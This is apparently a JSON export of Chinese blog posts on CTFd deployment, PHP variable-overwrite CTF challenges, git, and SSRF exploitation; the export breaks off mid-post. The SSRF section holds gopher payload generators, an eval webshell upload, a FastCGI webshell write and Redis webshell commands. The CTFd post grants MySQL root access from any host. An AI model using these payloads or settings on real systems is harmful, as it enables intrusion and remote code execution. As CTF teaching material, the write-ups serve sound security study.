CONVERT TO CHARACTER SET utf8;ALTER TABLE tags CONVERT TO CHARACTER SET utf8;ALTER TABLE teams CONVERT TO CHARACTER SET utf8;ALTER TABLE tracking CONVERT TO CHARACTER SET utf8;ALTER TABLE unlocks CONVERT TO CHARACTER SET utf8;ALTER TABLE users CONVERT TO CHARACTER SET utf8; 允许远程访问 123456use mysql;mysql&gt; update user set `host` = '%' where `user` = 'root' LIMIT 1;#如果已分配过，该步骤可跳过mysql&gt; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root密码' WITH GRANT OPTION;mysql&gt; flush privileges;mysql&gt; select host,user from user; 修改mysqld.cnf 123 vim /etc/mysql/mysql.conf.d/mysqld.cnf将bind-address = 127.0.0.1注释掉（即在行首加#) 重启myqsl 1service mysql restart 导入外部的数据库（忽略） 123创建数据库：create database js;选择数据库：use js;导入mysql文件：source sql文件的详细地址 0x4.4在CTFd根目录下CTFd/config.py中修改数据库配置: 12#DATABASE_URL = os.getenv('DATABASE_URL') or 'sqlite:///&#123;&#125;/ctfd.db'.format(os.path.dirname(os.path.abspath(__file__)))DATABASE_URL = 'mysql+pymysql://数据库用户:密码@localhost:3306/ctfd' 0x5本地运行1sudo pythons server.py 访问 1127.0.0.1:4000 此时只能在本地上访问。 0x6让外网访问安装gunicorn并运行CTFd 1sudo python2 -m pip install gunicorn 进入 CTFd项目目录运行如下命令 1sudo gunicorn --bind 0.0.0.0:8080 -w 1 \"CTFd:create_app()\" 将网站映射到8080端口，外网访问 0x5和0x6的运行方式测试一下玩玩还ok,多人的话就选择apache或nginx，服务器配置高的话就选择apache搭建(此处的apache搭建没成功)，配置低的话选择nginx较好。 mod_wsgi+apache 搭建安装apache 1sudo apt install apache2 0x1安装mod_swigi 12apt-get install libapache2-mod-wsgipython2 -m pip install mod_wsgi 如果出现apxs的错误,运行如下命令 1sudo apt install apache2-dev 要验证安装是否成功，请使用start-server命令运行mod_wsgi-express脚本 1mod_wsgi-express start-server 0x2修改wsgi.py文件在CFTd/wsgi.py 12345import syssys.path.insert(0, '/var/www/CTFd')from CTFd import create_appapplication = create_app() 0x3新建站点文件详细知识可看apache的站点文件配置在/etc/apache2/sites-available中新建一个ctfd.conf 1234567891011121314151617&lt;VirtualHost *:80&gt; DocumentRoot /var/www/html/CTFd ErrorLog /var/www/html/CTFd/log/error.log CustomLog /var/www/html/CTFd/log/access.log combined WSGIDaemonProcess CTFd python-path=/www/var/CTFd user=www-data group=www-data threads=5 WSGIScriptAlias / /var/www/html/CTFd/wsgi.py &lt;Directory /var/www/html/CTFd/&gt; WSGIProcessGroup CTFd WSGIApplicationGroup %&#123;GLOBAL&#125; #Order deny,allow #AllowOverride AllRequire all granted Require all granted #Allow from all &lt;/Directory&gt; &lt;/VirtualHost&gt; 配置参数信息详细可看Apache配置文件httpd.conf详解建立软连接到sites-enabled 1ln -s /etc/apache2/sites-available/ctfd.conf /etc/apache2/sites-enabled/ctfd.conf 重启apache2 1/etc/init.d/apache2 restart 还是有点搭建不成功，留着以后思考 nginx+uwsgi搭建0x1修改wsgi.py文件在CFTd/wsgi.py 12345import syssys.path.insert(0, '/var/www/CTFd')from CTFd import create_appapplication = create_app() 0x2 uwsgi 12pip install uwsgi apt install uwsgi 在/etc/uwsgi/apps-available 新建uwsgi.ini文件 12/etc/uwsgi/apps-availabletouch uwsgi.ini 配置uwsgi.int文件内容 12345678910111213141516171819202122232425262728293031323334[uwsgi]# Where you've put CTFDchdir = /var/www/CTFd/ #项目文件位置# If SCRIPT_ROOT is not /#mount = /ctf=wsgi.py# SCRIPT_ROOT is /mount = /=\"CTFd:create_app()\" # You shouldn't need to change anything past hereplugin = pythonmodule = wsgisocket= /tmp/uwsgi.sock chmod-socket = 666master=trueprocesses = 400threads = 10max-requests = 100enable-threads = truevacuum = truemod-socket = 666 manage-script-name = truewsgi-file = wsgi.pycallable = application #具体看wsgi.py中的application = create_app() die-on-term = true # If you're not on debian/ubuntu, replace with uid/gid of web user#socket=/tmp/uwsgi.sockuid = www-datagid = www-datadaemonize=/var/log/uwsgi/ctfd.log 建立软连接到apps-enabled/下 1ln -s /etc/uwsgi/apps-available/uwsgi.ini /etc/uwsgi/apps-enabled/uwsgi.ini 在apps-enabled/下运行 1uwsgi -d --ini &#x2F;etc&#x2F;uwsgi&#x2F;apps-enabled&#x2F;uwsgi.ini CTFd目录用户权限赋值 1chown -R www-data:www-data CTFd/ 如果遇到权限问题可以看此文章:http://www.voidcn.com/article/p-xohpfusg-bsw.html 如果要杀掉uwsgi进程的命令 1234#通过ps，查看uwsgi相关进程ps aux|grep uwsgi#kill pid会发送SIGTERM，只会导致重启，而不是结束掉。需要发送SIGINT或SIGQUIT，对应着是INT才可以killall -s INT /usr/local/bin/uwsgi 0x3 修改nginx配置文件修改/etc/ngingx/sites-avaliable下的default文件为 123456789101112131415161718server &#123; listen 80 default_server; listen [::]:80 default_server; root /var/www/CTFd; # 自行修改项目位置 index index.html index.htm server_name 120.79.24.186; location / &#123; try_files $uri @yourapplication; &#125; location @yourapplication &#123; #try_files $uri $uri/ =404; root /var/www/CTFd; include uwsgi_params; uwsgi_pass unix:/tmp/uwsgi.sock; &#125; location /static &#123; root /var/www/CTfd/CTFd/themes/core/static/; &#125; &#125; nginx详细的配置文件信息可看nginx服务器安装及配置文件详解参考教程:CTFd搭建CTF平台http://www.ifuryst.com/archives/CTFd.htmlmod_wsgi (Apache)https://dormousehole.readthedocs.io/en/latest/deploying/mod_wsgi.html官方搭建教程 https://github.com/CTFd/CTFd/wiki/Getting-Startedctfd(flask+nginx+redis)搭建日记https://blog.csdn.net/weixin_41073695/article/details/86697749","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"ctfd","slug":"ctfd","permalink":"https://blog.cfyqy.com/tags/ctfd/"}],"author":"ye1s"},{"title":"flask学习","slug":"flask学习","date":"2019-03-30T03:28:00.000Z","updated":"2020-04-13T08:13:52.540Z","comments":true,"path":"article/134f4b48.html","link":"","permalink":"https://blog.cfyqy.com/article/134f4b48.html","excerpt":"Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2。","text":"Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2。 思维导图来源:https://blog.csdn.net/weixin_42105977/article/list/4? flask初始化 程序基本结构 模板 表单 数据库 电子邮件 大型程序结构 Flask上下文与请求钩子","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"flask","slug":"flask","permalink":"https://blog.cfyqy.com/tags/flask/"}],"author":"ye1s"},{"title":"django学习","slug":"ango学习","date":"2019-03-28T02:12:00.000Z","updated":"2020-04-13T08:11:36.816Z","comments":true,"path":"article/4aaa6d8.html","link":"","permalink":"https://blog.cfyqy.com/article/4aaa6d8.html","excerpt":"jango是一个开放源代码的Web应用框架，由Python写成。采用了MVC的框架模式。","text":"jango是一个开放源代码的Web应用框架，由Python写成。采用了MVC的框架模式。 基本命令 基本目录 settings.py 视图 路由 模板0x1简述0x2 控制语句0x3 过滤0x4 模板继承 ORM0x1数据库配置0x2 ORM表模型0x3 ORM操作0x4 查询数据库优化 声明周期 form表单 用户认证 中间件 信号参考文章:http://www.cnblogs.com/derek1184405959/p/8533625.html","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"django","slug":"django","permalink":"https://blog.cfyqy.com/tags/django/"},{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"}],"author":"ye1s"},{"title":"php变量覆盖问题","slug":"p变量覆盖问题","date":"2019-03-27T12:50:00.000Z","updated":"2020-04-13T08:18:38.489Z","comments":true,"path":"article/87ca5e58.html","link":"","permalink":"https://blog.cfyqy.com/article/87ca5e58.html","excerpt":"通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。导致该漏洞的场景有: $$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等","text":"通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。导致该漏洞的场景有: $$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等 详细可以看此文章: https://www.freebuf.com/column/150731.html $$0x1例题1 传入 1?name=note 将覆盖原来$name的值题目： 12345678910&lt;?phpshow_source(__FILE__);$name='test';foreach ($_GET as $key =&gt; $value) $$key = $value;var_dump($key);var_dump($value);var_dump($$key);echo $name;?&gt; 0x2例题2解法: 12 ?_200=flagpost: flag=test 题目:index.php 1234567891011121314151617&lt;?phpinclude \"flag.php\";$_403 = \"Access Denied\";$_200 = \"Welcome Admin\";if ($_SERVER[\"REQUEST_METHOD\"] != \"POST\") die(\"BugsBunnyCTF is here :p…\");if ( !isset($_POST[\"flag\"]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[\"flag\"] !== $flag ) die($_403);echo \"This is your flag : \". $flag . \"\\n\";die($_200);?&gt; flag.php 1$flag=\"this is a flag\"; extract()extract(array,extract_rules,prefix)该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。extract_rules默认的规则是EXTR_OVERWRITE 变量冲突时覆盖已有的变量。0x1 例题1：解法: 1get请求: ?flag=&amp;gift= 题目: 12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));//file_get_contents()函数将整个文件读入一个字符串if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; parse_str()parse_str ( string $encoded_string [, array &amp;$result ] )如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）解法: 1?id=a[0]=240610708 题目: 1234567891011121314151617&lt;?phperror_reporting(0);if (empty($_GET['id'])) &#123; show_source(__FILE__); die();&#125; else &#123; include ('flag.php'); $a = \"www.OPENCTF.com\"; $id = $_GET['id']; @parse_str($id); if ($a[0]!='QNKCDZO' &amp;&amp; md5($a[0])==md5('QNKCDZO')) &#123; echo $flag; &#125; else &#123; exit('其实很简单其实并不难！'); &#125;&#125;?&gt; import_request_variables()import_request_variables() GET／POST／Cookie 变量导入到全局作用域中解法: 1?b=0 题目: 12345&lt;?php$b=1;import_request_variables('GP');print_r($b);?&gt; 全局变量覆盖全局变量覆盖的关键是register_globalsregister_globals的意思就是注册为全局变量。当register_globals=On，用户传递的值会被直接的注册为全局变量直接使用；register_globals==Off，需要到特定的数组里去得到它。也就是说为on的时候，变量可以从各个地方传来，当为off的时候，不会有问题。在php5.4已经被删除。解法： 1?auth=1 题目: 12345678&lt;?php$auth=0;echo \"Register_globals: \".(int)ini_get(\"register_globals\").\"&lt;br/&gt;\";if ($auth)&#123;echo \"private!\";&#125;?&gt; 参考文章:https://www.freebuf.com/column/150731.htmlextract变量覆盖:https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/ https://virtua11.github.io/2018/07/10/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://blog.cfyqy.com/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}],"author":"ye1s"},{"title":"sqlmap脑图","slug":"sqlmap脑图","date":"2019-03-26T07:20:00.000Z","updated":"2020-04-13T08:20:25.572Z","comments":true,"path":"article/2bbb3c36.html","link":"","permalink":"https://blog.cfyqy.com/article/2bbb3c36.html","excerpt":"Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。","text":"Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://blog.cfyqy.com/tags/sqlmap/"}],"author":"ye1s"},{"title":"git命令","slug":"git命令","date":"2019-03-25T15:50:00.000Z","updated":"2020-10-10T13:54:42.968Z","comments":true,"path":"article/341ecd43.html","link":"","permalink":"https://blog.cfyqy.com/article/341ecd43.html","excerpt":"突然在文件里看到了一个git命令脑图，整理得挺好的。","text":"突然在文件里看到了一个git命令脑图，整理得挺好的。 git提交本地分支到远程分支1.在本地项目的文件夹下，git仓库初始化 1git init 2.将本地文件索引添加至git库中 1git add * 3. 12git commit -m \"first\" # -m 后为提交日志 4.可查看本地仓库分支，发现会出现一个master的分支 12git branch 5.配置远程仓库 12git remote add test http://xxxx@git.XXXX.com/scm/wbqa/xxxx.git# test 为远程仓库别名 后面http 为远程仓库地址 6.配置完成后，可使用 git remote -v 命令查看是否生效 1git remote -v 7.创建分支 1git branch web 8切换到新建的分支 1git checkout web 8.使用push命令，将代码提交到远程仓库分支 1$ git push test web 如果出现如下错误 123456 ! [rejected] master -&gt; master (non-fast-forward)error: failed to push some refs to 'https://github.com/xx/xxx'hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: 'git pull ...') before pushing again.hint: See the 'Note about fast-forwards' in 'git push --help' for details. 尝试-f 12git push -f test master:jenkinsapi .git文件详情1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.git| config #项目的配置文件| description # 仓库的描述信息，主要给gitweb等git托管系统使用| HEAD #此文件永远存储当前位置指针，指向当前工作区的分支| index #index也称为stage，是一个索引文件。当执行git add后，文件就会存入Git的对象objects里，并使用索引进行定位。所以，只要执行了git add，就算工作目录中的文件被误删除，也不会引起文件的丢失；创建了一个提交(commit), 那么提交的是当前索引(index)里的内容, 而不是工作目录中的内容。 packed-refs| COMMIT_EDITMSG # 保存最新的commit message，Git系统不会用到这个文件，只是给用户一个参考。+---hooks # 放一些shell脚本，可以设置特定的git命令后触发相应的脚本。hooks里存放 git 提交的各个阶段文件，用于在 git 命令前后做检查或做些自定义动作| applypatch-msg.sample #用于 git am 命令提交信息校验| commit-msg.sample # git commit 之前，编辑器退出后触发，传入 COMMIT_EDITMSG 文件名| fsmonitor-watchman.sample # 配合 core.fsmonitor 设置来更好监测文件变化| post-update.sample # git push 之后，服务端更新每一个 ref 时触发，用于针对每个 ref 作校验等| pre-applypatch.sample # 用于 git am 命令执行前动作| pre-commit.sample # git commit 之前，commit-msg 通过后触发，譬如校验文件名是否含中文| pre-push.sample # git push 之前触发| pre-rebase.sample # git rebase 之前触发，传入 rebase 分支作参数| pre-receive.sample # git push 之后，服务端更新 ref 前触发| prepare-commit-msg.sample # git commit 之前，编辑器启动之前触发，传入 COMMIT_FILE，COMMIT_SOURCE，SHA1| update.sample|+---info| exclude #初始化时只有这个文件，用于排除提交规则，与 .gitignore 功能类似。他们的区别在于.gitignore 这个文件本身会提交到版本库中去，用来保存的是公共需要排除的文件；而info/exclude 这里设置的则是你自己本地需要排除的文件，他不会影响到其他人，也不会提交到版本库中去| refs #如果新建了分支后，就会有此文件 ，用于跟踪各分支的信息。|+---logs # 保存所有更新操作的引用记录，主要用于git reflog等| | HEAD #直接记录在所有分支上的操作| || \\---refs| +---heads| | master #记录各自分支的操作记录| || \\---remotes| \\---origin| HEAD|+---objects # 所有文件的存储对象。在执行了git add之后，文件就已经存入objects里| +---info #记录对象存储的附加信息| \\---pack #执行 git gc 后都会全部打包到 pack 里。.pack 存储对象文件，.idx 是索引文件，用于允许它们被随机访问| pack-8fdd1120297c68c8c389812f252037dfd1077afd.idx| pack-8fdd1120297c68c8c389812f252037dfd1077afd.pack|\\---refs #refs文件夹存储着分支和标签的引用 +---heads #一般通过 git branch 生成，git show-ref --heads 可以查看 | master # 标识了本地项目中的master分支指向的当前commit的哈希值。 | +---remotes | \\---origin | HEAD | \\---tags #一般通过 git tag 生成。git show-ref --tags 可以查看 ctf考点12345python GitHack.py http://123.207.178.76:8105/.git/# 进入目录，进行回滚操作git log # 输出所有的日志git checkout \"ea2b29\" #切换分支或恢复工作树文件cat index.php 参考文章: 解析.git文件夹，深入了解git内部原理","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"git","slug":"git","permalink":"https://blog.cfyqy.com/tags/git/"}],"author":"ye1s"},{"title":"sqlserver复习","slug":"lserver复习","date":"2019-03-25T15:02:00.000Z","updated":"2019-03-25T16:05:21.874Z","comments":true,"path":"article/52527819.html","link":"","permalink":"https://blog.cfyqy.com/article/52527819.html","excerpt":"当初没有认真学，有点挺后悔的，这次就多花时间来复习一下吧。","text":"当初没有认真学，有点挺后悔的，这次就多花时间来复习一下吧。 sqlserver概述 关系数据库的基本理论 数据库设计 SQL Server 概述 数据库与数据表管理 SELECT数据查询 视图与索引 存储过程、触发器和用户定义函数 数据库并发控制 数据库安全管理 数据库备份与恢复","categories":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"sqlserver","slug":"sqlserver","permalink":"https://blog.cfyqy.com/tags/sqlserver/"}],"author":"ye1s"},{"title":"vim语法","slug":"im语法","date":"2019-03-20T13:29:00.000Z","updated":"2020-04-13T08:14:14.724Z","comments":true,"path":"article/15f65e96.html","link":"","permalink":"https://blog.cfyqy.com/article/15f65e96.html","excerpt":"网上找的一张vim的脑图。","text":"网上找的一张vim的脑图。","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://blog.cfyqy.com/tags/vim/"}],"author":"ye1s"},{"title":"ssrf汇总","slug":"rf","date":"2019-03-19T12:19:00.000Z","updated":"2021-04-30T08:44:37.898Z","comments":true,"path":"article/b7a1d97e.html","link":"","permalink":"https://blog.cfyqy.com/article/b7a1d97e.html","excerpt":"SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞","text":"SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞 ssrf相关利用CTF中SSRF的一些trick了解SSRF,这一篇就足够了 漏洞产生file_get_contents12345678910&lt;?phpif (isset($_POST['url'])) &#123; $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().'img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; &#125;echo $img;?&gt; 这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户 fsockopen()123456789101112131415161718192021222324252627282930&lt;?phpfunction GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo \"$errstr (error number $errno) \\n\"; &#125; else &#123; $out = \"GET $link HTTP/1.1\\r\\n\"; $out .= \"Host: $host\\r\\n\"; $out .= \"Connection: Close\\r\\n\\r\\n\"; $out .= \"\\r\\n\"; fwrite($fp, $out); $contents=''; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125;&#125;if(isset($_GET['url']))&#123; $host=\"localhost\"; $port=80; $link=$_GET['url']; echo GetFile($host,$port,$link);&#125;?&gt; 这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据 curl_exec()123456789101112131415&lt;?php if (isset($_POST['url'])) &#123; $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = './curled/'.rand().'.txt'; file_put_contents($filename, $result); echo $result;&#125;?&gt; 使用 curl 获取数据 有无回显SSRF在有无回显方面的利用及其思考与总结 SSRF例题http/dict/file等协议使用内网访问1?url=http://127.0.0.1/flag.php 伪协议读取文件无法直接访问得到，用file://伪协议读取 1?url=file:///var/www/html/flag.php 端口扫描在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。 这里的端口扫描我们用burpsuite来完成。首先抓包，发送到Intruder进行爆破设置 url直接访问 1?url=http://127.0.0.1:8657 gopher协议POST 请求接着，我们将index.php和flag.php的源码读出来： python 12/?url=file:///var/www/html/index.php/?url=file:///var/www/html/flag.php index.php： 12345678910111213141516&lt;?phperror_reporting(0);if (!isset($_REQUEST['url']))&#123; header(\"Location: /?url=_\"); exit;&#125;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_exec($ch);curl_close($ch); flag.php： 12345678910111213141516171819202122&lt;?phperror_reporting(0);if ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") &#123; echo \"Just View From 127.0.0.1\"; return;&#125;$flag=getenv(\"CTFHUB\");$key = md5($flag);if (isset($_POST[\"key\"]) &amp;&amp; $_POST[\"key\"] == $key) &#123; echo $flag; exit;&#125;?&gt;&lt;form action=\"/flag.php\" method=\"post\"&gt;&lt;input type=\"text\" name=\"key\"&gt;&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;&lt;/form&gt; http访问flag.php 1?url=http://127.0.0.1/flag.php 右键查看源代码发现key： 12345&lt;form action=\"/flag.php\" method=\"post\"&gt;&lt;input type=\"text\" name=\"key\"&gt;&lt;!-- Debug: key=86dee61812c0f9821d07b9b8fdf56790--&gt;&lt;/form&gt; 看来应该是让我们输入这个key进入，从而得到flag，但是这里并没有提交的按钮啊，所以我们要自己构造post请求，将这个key发送过去。 然后，我们用gopher协议构造post请求： 12345678910111213141516import urllib.parsepayload =\\\"\"\"POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36key=86dee61812c0f9821d07b9b8fdf56790\"\"\" #注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://127.0.0.1:80/'+'_'+newresult = urllib.parse.quote(result)print(result) # 这里因为是GET请求所以要进行两次url编码 注意：上面那四个参数是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。 特别要注意Content-Length应为字符串“key=c384d200658f258e5b5c681bf0aa29a8”的长度。 执行该python脚本即可生成符合gopher协议格式的payload： 1?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D86dee61812c0f9821d07b9b8fdf56790%250D%250A 上传文件构造如下payload进行ssrf，从目标机本地访问flag.php： 1/?url=http://127.0.0.1/flag.php 得到一个文件上传的页面，让我们上传一个Webshell。 这题和上一题“POST请求”其实差不多，只不过上一题用POST方法传递key，这道题用POST方法传递的是文件。 接着，我们将index.php和flag.php的源码读出来： 12/?url=file:///var/www/html/index.php/?url=file:///var/www/html/flag.php index.php： 123456789101112131415&lt;?phperror_reporting(0);if (!isset($_REQUEST['url'])) &#123; header(\"Location: /?url=_\"); exit;&#125;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_exec($ch);curl_close($ch); flag.php： 123456789101112131415161718192021&lt;?phperror_reporting(0);if($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\")&#123; echo \"Just View From 127.0.0.1\"; return;&#125;if(isset($_FILES[\"file\"]) &amp;&amp; $_FILES[\"file\"][\"size\"] &gt; 0)&#123; echo getenv(\"CTFHUB\"); exit;&#125;?&gt;Upload Webshell&lt;form action=\"/flag.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\"&gt;&lt;/form&gt; 可以发现flag.php确实是个文件上传的页面，且仅要求上传的文件大小大于0即可得到flag，并没有任何过滤。接下来我们尝试利用gopher协议上传文件。 首先就是要得到文件上传的数据包，才能编写gopher的payload。因此我们对这个文件上传的flag.php页面进行F12前端改写，添加一个submit提交按钮（但这里点击提交按钮是得不到flag的，必须从目标机本地访问哦）： 可以发现flag.php确实是个文件上传的页面，且仅要求上传的文件大小大于0即可得到flag，并没有任何过滤。接下来我们尝试利用gopher协议上传文件。 首先就是要得到文件上传的数据包，才能编写gopher的payload。因此我们对这个文件上传的flag.php页面进行F12前端改写，添加一个submit提交按钮（但这里点击提交按钮是得不到flag的，必须从目标机本地访问哦）： &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; 随便上传一个非空的文件，然后抓包，修改 Host 主机： 123456789101112131415161718192021222324252627282930313233import urllib.parsepayload =\\\"\"\"POST /flag.php HTTP/1.1Host: 127.0.0.1:80User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------295876417737592404551854917111Content-Length: 393Origin: http://challenge-4f1d8144a47b9d33.sandbox.ctfhub.com:10080Connection: closeReferer: http://challenge-4f1d8144a47b9d33.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.phpUpgrade-Insecure-Requests: 1-----------------------------295876417737592404551854917111Content-Disposition: form-data; name=\"file\"; filename=\"1.gif\"Content-Type: image/gif&lt;script language = 'php'&gt;@eval($_POST[cmd]);&lt;/script&gt;-----------------------------295876417737592404551854917111Content-Disposition: form-data; name=\"submit\"æäº¤æ¥è¯¢-----------------------------295876417737592404551854917111--\"\"\" #注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://127.0.0.1:80/'+'_'+newresult = urllib.parse.quote(result)print(result) # 这里因为是GET请求所以要进行两次url编码 FastCGI协议FastCGI 维基百科对FastCGI的解释：快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。 php-fpm 官方对php-fpm的解释是FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。也就是说php-fpm是FastCGI的一个具体实现，其默认监听9000端口。 php-fpm攻击实现原理 想要分析它的攻击原理需要从FastCGI协议封装数据内容来看，这里仅对攻击原理做简要描述，CGI 和 FastCGI 协议的运行原理 这篇文章中详细介绍了FastCGI协议的内容，其攻击原理就是在设置环境变量实际请求中会出现一个 SCRIPT_FILENAME’: ‘/var/www/html/index.php 这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。 而在php5.3.9后来的版本中，php增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在php官方允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改php的设置。 那么当设置php环境变量为：auto_prepend_file = php://input;allow_url_include = On 时，就会在执行php脚本之前包含环境变量auto_prepend_file 所指向的文件内容，php://input 也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。 详情请看：https://bbs.ichunqiu.com/thread-58455-1-1.html 接下来，我们使用 Gopherus 工具生成攻击FastCGI的payload。 利用条件： libcurl版本&gt;=7.45.0 PHP-FPM监听端口 PHP-FPM版本 &gt;= 5.3.3 知道服务器上任意一个php文件的绝对路径 下面我们就利用这个工具来执行命令，网web目录里面写Webshell： 123python gopherus.py --exploit fastcgi/var/www/html/index.php # 这里输入的是一个已知存在的php文件echo PD9waHAgZXZhbCgkX1BPU1RbJ3llMXMnXSk7Pz47 | base64 -d &gt; /var/www/html/shell.php 然后进行二次编码后将最终的payload内容放到?url=后面发送过去（这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码）：连接shell.php redis如上图所示，我们在目标主机的6379端口上发现了Redis的报错，说明目标主机上确实运行着Redis服务，并且端口为其默认端口6379。 利用未授权访问攻击Redis的方法有很多，我们可以写webshell、反弹shell，也可以写ssh公钥，这里我们用写webshell的方法。 构造redis命令 12345flushallset 1 '&lt;?php eval($_POST[\"ye1s\"]);?&gt;'config set dir /var/www/htmlconfig set dbfilename shell.phpsave 我们利用如下Exp脚本生成符合gopher协议格式的payload： 